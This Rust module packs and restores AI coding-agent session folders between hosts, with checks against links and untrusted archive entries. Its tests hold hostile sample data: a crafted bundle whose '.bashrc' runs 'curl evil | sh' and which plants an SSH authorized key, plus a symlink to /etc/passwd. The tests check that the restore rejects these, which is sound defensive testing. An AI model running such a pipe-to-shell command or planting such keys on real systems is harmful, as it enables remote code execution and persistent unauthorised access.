//! Session bundles (ADR-0097, the protocol v2 feature `session.bundle`): the runtime's
//! session folders of a session home, which the server keeps between turns, so that a turn
//! resumes its session on any company host.
//!
//! - When a run with `run.assign.sessionBundle` ends, the host packs the runtime's session
//!   folders ([`session_dirs`]) of the home as a gzip-compressed tar, at most
//!   [`SESSION_BUNDLE_MAX_UNPACKED_BYTES`] before and [`SESSION_BUNDLE_MAX_BYTES`] after
//!   compression, and uploads it to the server, which scans and stores it.
//! - Before the sandbox of a run whose `sessionBundle` names a bundle starts, the host
//!   downloads it, checks its size and SHA-256, and unpacks it with the rules of `/output`
//!   (relative paths, regular files and directories only, within caps) into a directory of its
//!   own; then each of the runtime's session folders in it replaces the home's. Nothing else of
//!   the bundle reaches the home.
//! - `homes/<agentId>/<workItemId>.bundle` names the bundle the home's folders were last stored as
//!   or restored from: a home that holds the assigned bundle already is left as it is.
//!
//! A bundle that cannot be stored or restored is a log line of the run, never a failed run:
//! the turn then starts a new session.

use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{Context, Result, anyhow, bail};
use flate2::Compression;
use flate2::read::GzDecoder;
use flate2::write::GzEncoder;
use http_body_util::{BodyExt, Empty, Full, Limited};
use hyper::body::Bytes;
use hyper::{Request, StatusCode, header};
use serde::Deserialize;
use tinfirm_bridge::files::{self, Limits};
use tinfirm_protocol::{Runtime, SESSION_BUNDLE_MAX_BYTES, SESSION_BUNDLE_MAX_UNPACKED_BYTES};
use uuid::Uuid;

use crate::homes::{DELETE_PREFIX, bundle_record_path};

/// How long an upload or a download of a bundle may take.
const TRANSFER_TIMEOUT: Duration = Duration::from_secs(300);

/// The session folders of a runtime, relative to the home, and what stays out of them.
pub fn session_dirs(runtime: Runtime) -> (&'static [&'static str], &'static [&'static str]) {
    match runtime {
        Runtime::ClaudeCode => (&[".claude/projects", ".claude/todos"], &[]),
        Runtime::Codex => (&[".codex/sessions"], &[]),
        Runtime::Pi => (&[".pi/agent/sessions"], &[]),
        Runtime::Opencode => (
            &[".local/share/opencode"],
            &[".local/share/opencode/log", ".local/share/opencode/bin"],
        ),
    }
}

/// A home's session folders, packed.
#[derive(Debug)]
pub enum Packed {
    /// The gzip-compressed tar.
    Bundle(Vec<u8>),
    /// The home has none of the runtime's session folders.
    Empty,
    /// Over [`SESSION_BUNDLE_MAX_UNPACKED_BYTES`] or [`SESSION_BUNDLE_MAX_BYTES`].
    TooLarge,
}

/// A writer that refuses more than `left` bytes.
struct Capped<W> {
    inner: W,
    left: u64,
}

impl<W: Write> Write for Capped<W> {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        if buf.len() as u64 > self.left {
            return Err(io::Error::other(TOO_LARGE));
        }
        let n = self.inner.write(buf)?;
        self.left -= n as u64;
        Ok(n)
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}

const TOO_LARGE: &str = "the session bundle is too large";

/// Packs the runtime's session folders of `home`. Links are packed as links, which a restore
/// leaves out; nothing is followed out of the home: a session folder counts only when it and
/// every ancestor of it under the home are plain directories, by `lstat` (L25 of the security
/// review of 2026-10-27: `~/.codex` is the agent's, and a link there would pack another
/// home's sessions into this conversation's bundle).
pub fn pack(home: &Path, runtime: Runtime) -> io::Result<Packed> {
    let (dirs, exclude) = session_dirs(runtime);
    let present: Vec<String> = dirs
        .iter()
        .filter(|dir| {
            files::ancestors_are_plain_dirs(home, Path::new(dir))
                && std::fs::symlink_metadata(home.join(dir)).is_ok_and(|m| m.is_dir())
        })
        .map(|dir| dir.to_string())
        .collect();
    if present.is_empty() {
        return Ok(Packed::Empty);
    }
    let exclude: Vec<String> = exclude.iter().map(|e| e.to_string()).collect();
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let capped = Capped {
        inner: encoder,
        left: SESSION_BUNDLE_MAX_UNPACKED_BYTES,
    };
    let capped = match files::pack(home, &present, &exclude, capped) {
        Ok(capped) => capped,
        Err(e) if e.to_string() == TOO_LARGE => return Ok(Packed::TooLarge),
        Err(e) => return Err(e),
    };
    let bundle = capped.inner.finish()?;
    if bundle.len() as u64 > SESSION_BUNDLE_MAX_BYTES {
        return Ok(Packed::TooLarge);
    }
    Ok(Packed::Bundle(bundle))
}

/// What a restore put into the home.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct Restored {
    /// The session folders it replaced, relative to the home.
    pub dirs: Vec<String>,
    pub files: usize,
    /// What it left out: links, devices, and entries outside the runtime's session folders.
    pub left_out: Vec<String>,
}

/// Unpacks `bundle` into a directory beside `home`, then puts each of the runtime's session
/// folders of it in place of the home's. The home is created when it is not there.
pub fn restore(home: &Path, runtime: Runtime, bundle: &[u8]) -> Result<Restored> {
    let parent = home.parent().context("a session home has a parent")?;
    std::fs::create_dir_all(home).with_context(|| format!("cannot create {}", home.display()))?;
    let scratch = parent.join(format!("{DELETE_PREFIX}bundle-{}", Uuid::new_v4().simple()));
    let result = restore_via(home, runtime, bundle, &scratch);
    let _ = std::fs::remove_dir_all(&scratch);
    result
}

fn restore_via(home: &Path, runtime: Runtime, bundle: &[u8], scratch: &Path) -> Result<Restored> {
    let limits = Limits {
        max_files: 100_000,
        max_bytes: SESSION_BUNDLE_MAX_UNPACKED_BYTES,
        max_file_bytes: SESSION_BUNDLE_MAX_UNPACKED_BYTES,
    };
    let unpacked = files::unpack_untrusted(GzDecoder::new(bundle), scratch, &limits)
        .map_err(|e| anyhow!("the session bundle cannot be unpacked: {e}"))?;
    let (dirs, exclude) = session_dirs(runtime);
    let mut restored = Restored {
        files: unpacked.files,
        left_out: unpacked.left_out,
        ..Restored::default()
    };
    // Entries outside the runtime's session folders, or in what stays out of them, are dropped.
    for entry in top_entries(scratch, dirs)? {
        restored.left_out.push(entry);
    }
    for excluded in exclude {
        let path = scratch.join(excluded);
        if std::fs::symlink_metadata(&path).is_ok() {
            let _ = std::fs::remove_dir_all(&path).or_else(|_| std::fs::remove_file(&path));
            restored.left_out.push(excluded.to_string());
        }
    }
    for dir in dirs {
        let from = scratch.join(dir);
        if !std::fs::symlink_metadata(&from).is_ok_and(|m| m.is_dir()) {
            continue;
        }
        let to = home.join(dir);
        replace_dir(home, &from, &to)?;
        restored.dirs.push(dir.to_string());
    }
    Ok(restored)
}

/// The paths of `scratch` that are not in or above one of `dirs`.
fn top_entries(scratch: &Path, dirs: &[&str]) -> Result<Vec<String>> {
    let mut outside = Vec::new();
    let mut stack = vec![PathBuf::new()];
    while let Some(rel) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(scratch.join(&rel)) else {
            continue;
        };
        for entry in entries.filter_map(Result::ok) {
            let child = rel.join(entry.file_name());
            let name = child.to_string_lossy().into_owned();
            let inside = dirs.iter().any(|d| child.starts_with(d));
            let above = dirs.iter().any(|d| Path::new(d).starts_with(&child));
            if inside {
                continue;
            }
            if above && entry.file_type().is_ok_and(|t| t.is_dir()) {
                stack.push(child);
            } else {
                outside.push(name);
            }
        }
    }
    outside.sort();
    Ok(outside)
}

/// Puts `from` in place of `to` below `home`, whose parents it creates; never through a link.
fn replace_dir(home: &Path, from: &Path, to: &Path) -> Result<()> {
    let rel = to
        .strip_prefix(home)
        .context("a session folder is below the home")?;
    let mut parent = home.to_path_buf();
    if let Some(parents) = rel.parent() {
        for component in parents.components() {
            parent.push(component);
            match std::fs::symlink_metadata(&parent) {
                Ok(meta) if meta.is_dir() => {}
                Ok(_) => {
                    // A file or a link where a folder of the session goes: it goes.
                    std::fs::remove_file(&parent)?;
                    std::fs::create_dir(&parent)?;
                }
                Err(e) if e.kind() == io::ErrorKind::NotFound => std::fs::create_dir(&parent)?,
                Err(e) => return Err(e.into()),
            }
        }
    }
    match std::fs::symlink_metadata(to) {
        Ok(meta) if meta.is_dir() => {
            let old = parent.join(format!("{DELETE_PREFIX}{}", Uuid::new_v4().simple()));
            std::fs::rename(to, &old)?;
            std::fs::rename(from, to)?;
            let _ = std::fs::remove_dir_all(&old);
        }
        Ok(_) => {
            std::fs::remove_file(to)?;
            std::fs::rename(from, to)?;
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => std::fs::rename(from, to)?,
        Err(e) => return Err(e.into()),
    }
    Ok(())
}

/// The SHA-256 of the bundle the home's session folders last were, if the host knows one.
pub fn recorded(home: &Path) -> Option<String> {
    std::fs::read_to_string(bundle_record_path(home))
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| s.len() == 64 && s.bytes().all(|b| b.is_ascii_hexdigit()))
}

/// Records the bundle the home's session folders now are.
pub fn record(home: &Path, sha256: &str) -> io::Result<()> {
    std::fs::write(bundle_record_path(home), format!("{sha256}\n"))
}

/// Forgets the home's bundle: its folders changed since.
pub fn forget(home: &Path) {
    let _ = std::fs::remove_file(bundle_record_path(home));
}

/// The server's answer to an upload.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct UploadAnswer {
    pub status: String,
    #[serde(default)]
    pub message: String,
    #[serde(default)]
    pub sha256: Option<String>,
}

impl UploadAnswer {
    pub fn stored(&self) -> bool {
        self.status == "STORED"
    }
}

fn url(server_url: &str, run_id: Uuid, epoch: i64, session_id: Option<&str>) -> Result<url::Url> {
    let mut url = url::Url::parse(server_url).context("invalid server URL")?;
    url.set_path(&format!("/api/runner/v1/runs/{run_id}/session-bundle"));
    {
        let mut query = url.query_pairs_mut();
        query.clear();
        query.append_pair("epoch", &epoch.to_string());
        if let Some(session_id) = session_id {
            query.append_pair("sessionId", session_id);
        }
    }
    Ok(url)
}

/// Uploads the run's bundle of the session `session_id`.
pub async fn upload(
    server_url: &str,
    host_token: &str,
    run_id: Uuid,
    epoch: i64,
    session_id: &str,
    bundle: Vec<u8>,
) -> Result<UploadAnswer> {
    let url = url(server_url, run_id, epoch, Some(session_id))?;
    let request = Request::post(crate::attachments::path_and_query(&url))
        .header(header::HOST, crate::attachments::authority(&url))
        .header(header::AUTHORIZATION, format!("Bearer {host_token}"))
        .header(header::USER_AGENT, "tinfirm-runner-host")
        .header(header::CONTENT_TYPE, "application/gzip")
        .header(header::CONTENT_LENGTH, bundle.len())
        .body(Full::new(Bytes::from(bundle)))?;
    let response = crate::attachments::send(&url, request, TRANSFER_TIMEOUT).await?;
    let status = response.status();
    let body = Limited::new(response.into_body(), 64 * 1024)
        .collect()
        .await
        .map_err(|e| anyhow!("reading the server's answer failed: {e}"))?
        .to_bytes();
    if !status.is_success() {
        bail!("the server answered the upload with HTTP {status}");
    }
    serde_json::from_slice(&body).context("the server's answer to the upload is not readable")
}

/// Downloads the run's bundle and checks it against the assignment's size and SHA-256.
pub async fn download(
    server_url: &str,
    host_token: &str,
    run_id: Uuid,
    epoch: i64,
    sha256: &str,
    size: u64,
) -> Result<Vec<u8>> {
    if size > SESSION_BUNDLE_MAX_BYTES {
        bail!("the session bundle is larger than {SESSION_BUNDLE_MAX_BYTES} bytes");
    }
    let url = url(server_url, run_id, epoch, None)?;
    let request = Request::get(crate::attachments::path_and_query(&url))
        .header(header::HOST, crate::attachments::authority(&url))
        .header(header::AUTHORIZATION, format!("Bearer {host_token}"))
        .header(header::USER_AGENT, "tinfirm-runner-host")
        .body(Empty::<Bytes>::new())?;
    let response = crate::attachments::send(&url, request, TRANSFER_TIMEOUT).await?;
    if response.status() == StatusCode::NOT_FOUND {
        bail!("the server has the session bundle no longer");
    }
    if !response.status().is_success() {
        bail!("the server answered with HTTP {}", response.status());
    }
    let body = tokio::time::timeout(
        TRANSFER_TIMEOUT,
        Limited::new(response.into_body(), size as usize + 1).collect(),
    )
    .await
    .map_err(|_| anyhow!("the download of the session bundle timed out"))?
    .map_err(|e| anyhow!("the download of the session bundle failed: {e}"))?
    .to_bytes();
    if body.len() as u64 != size {
        bail!(
            "the session bundle has {} bytes, not the assigned {size}",
            body.len()
        );
    }
    if sha256_hex(&body) != sha256 {
        bail!("the session bundle's SHA-256 is not the assigned one");
    }
    Ok(body.to_vec())
}

/// Reads all of `input`; for tests.
#[doc(hidden)]
pub fn gunzip(bundle: &[u8]) -> io::Result<Vec<u8>> {
    let mut out = Vec::new();
    GzDecoder::new(bundle).read_to_end(&mut out)?;
    Ok(out)
}

/// Lower-case hex SHA-256.
pub fn sha256_hex(bytes: &[u8]) -> String {
    crate::attachments::hex(ring::digest::digest(&ring::digest::SHA256, bytes).as_ref())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(path: &Path, content: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, content).unwrap();
    }

    #[test]
    fn only_the_runtimes_session_folders_are_packed_and_restored() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("agent/task");
        write(
            &home.join(".claude/projects/-workspace/s1.jsonl"),
            "turn one\n",
        );
        write(&home.join(".claude/todos/s1.json"), "[]");
        write(&home.join(".claude/settings.json"), "{}");
        write(&home.join(".cache/big"), "cache");
        std::os::unix::fs::symlink("/etc/passwd", home.join(".claude/projects/link")).unwrap();
        let Packed::Bundle(bundle) = pack(&home, Runtime::ClaudeCode).unwrap() else {
            panic!("no bundle");
        };
        let tar = gunzip(&bundle).unwrap();
        let text = String::from_utf8_lossy(&tar);
        assert!(text.contains("turn one"));
        assert!(!text.contains("settings.json") && !text.contains("cache"));

        // Another host's home, with an older session and other files.
        let other = dir.path().join("elsewhere/task");
        write(
            &other.join(".claude/projects/-workspace/old.jsonl"),
            "old\n",
        );
        write(&other.join(".claude/settings.json"), "{\"mine\":1}");
        let restored = restore(&other, Runtime::ClaudeCode, &bundle).unwrap();
        assert_eq!(restored.dirs, [".claude/projects", ".claude/todos"]);
        assert_eq!(
            std::fs::read_to_string(other.join(".claude/projects/-workspace/s1.jsonl")).unwrap(),
            "turn one\n"
        );
        // The session folder is the bundle's, the rest of the home is the host's.
        assert!(!other.join(".claude/projects/-workspace/old.jsonl").exists());
        assert!(!other.join(".claude/projects/link").exists());
        assert!(
            restored.left_out.iter().any(|l| l.contains("link")),
            "{restored:?}"
        );
        assert_eq!(
            std::fs::read_to_string(other.join(".claude/settings.json")).unwrap(),
            "{\"mine\":1}"
        );
        // No scratch directory is left beside the home.
        let left: Vec<_> = std::fs::read_dir(dir.path().join("elsewhere"))
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(left, ["task"]);
        // Nothing to pack for a runtime without its folders.
        assert!(matches!(
            pack(&home, Runtime::Codex).unwrap(),
            Packed::Empty
        ));
    }

    /// L25 (security review of 2026-10-27): a session folder whose parent is a link (the
    /// agent's `~/.codex` pointing at another home) is not packed.
    #[test]
    fn a_session_folder_under_a_linked_parent_is_not_packed() {
        let dir = tempfile::tempdir().unwrap();
        let shared = dir.path().join("codex-homes/label/.codex");
        write(
            &shared.join("sessions/2026/other.jsonl"),
            "another conversation\n",
        );
        let home = dir.path().join("agent/task");
        std::fs::create_dir_all(&home).unwrap();
        std::os::unix::fs::symlink(&shared, home.join(".codex")).unwrap();
        assert!(matches!(
            pack(&home, Runtime::Codex).unwrap(),
            Packed::Empty
        ));
        // Deeper: `.local` is a link, `.local/share/opencode` is reached through it.
        let opencode = dir.path().join("elsewhere/.local");
        write(&opencode.join("share/opencode/s.json"), "other\n");
        std::os::unix::fs::symlink(&opencode, home.join(".local")).unwrap();
        assert!(matches!(
            pack(&home, Runtime::Opencode).unwrap(),
            Packed::Empty
        ));
        // The same folders as plain directories are packed.
        std::fs::remove_file(home.join(".codex")).unwrap();
        write(&home.join(".codex/sessions/mine.jsonl"), "mine\n");
        let Packed::Bundle(bundle) = pack(&home, Runtime::Codex).unwrap() else {
            panic!("no bundle");
        };
        let text = String::from_utf8_lossy(&gunzip(&bundle).unwrap()).into_owned();
        assert!(text.contains("mine") && !text.contains("another conversation"));
    }

    #[test]
    fn a_bundle_with_paths_outside_the_session_folders_puts_none_of_them_in_the_home() {
        let dir = tempfile::tempdir().unwrap();
        // A bundle as an agent could make it: the session, and a shell profile and an SSH key.
        let mut tar = tar::Builder::new(Vec::new());
        for (path, content) in [
            (".codex/sessions/s.jsonl", "session"),
            (".bashrc", "curl evil | sh"),
            (".ssh/authorized_keys", "ssh-ed25519 AAAA"),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, path, content.as_bytes())
                .unwrap();
        }
        let mut gz = GzEncoder::new(Vec::new(), Compression::default());
        gz.write_all(&tar.into_inner().unwrap()).unwrap();
        let bundle = gz.finish().unwrap();
        let home = dir.path().join("agent/task");
        let restored = restore(&home, Runtime::Codex, &bundle).unwrap();
        assert_eq!(restored.dirs, [".codex/sessions"]);
        assert!(home.join(".codex/sessions/s.jsonl").is_file());
        assert!(!home.join(".bashrc").exists());
        assert!(!home.join(".ssh").exists());
        assert_eq!(restored.left_out, [".bashrc", ".ssh"]);
    }

    #[test]
    fn an_oversized_home_is_too_large_and_a_damaged_bundle_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("agent/task");
        let big = home.join(".codex/sessions/big");
        std::fs::create_dir_all(big.parent().unwrap()).unwrap();
        // Real bytes: a sparse file goes into the tar as its data only.
        let mut file = std::fs::File::create(&big).unwrap();
        let chunk = vec![7u8; 1024 * 1024];
        for _ in 0..=(SESSION_BUNDLE_MAX_UNPACKED_BYTES / chunk.len() as u64) {
            file.write_all(&chunk).unwrap();
        }
        drop(file);
        let packed = pack(&home, Runtime::Codex);
        assert!(matches!(packed, Ok(Packed::TooLarge)), "{packed:?}");
        let error = restore(&dir.path().join("x/task"), Runtime::Codex, b"not gzip").unwrap_err();
        assert!(
            format!("{error:#}").contains("cannot be unpacked"),
            "{error:#}"
        );
    }

    #[test]
    fn the_record_names_the_homes_bundle() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("agent/task");
        std::fs::create_dir_all(&home).unwrap();
        assert_eq!(recorded(&home), None);
        let sha = "ab".repeat(32);
        record(&home, &sha).unwrap();
        assert_eq!(recorded(&home).as_deref(), Some(sha.as_str()));
        forget(&home);
        assert_eq!(recorded(&home), None);
    }
}
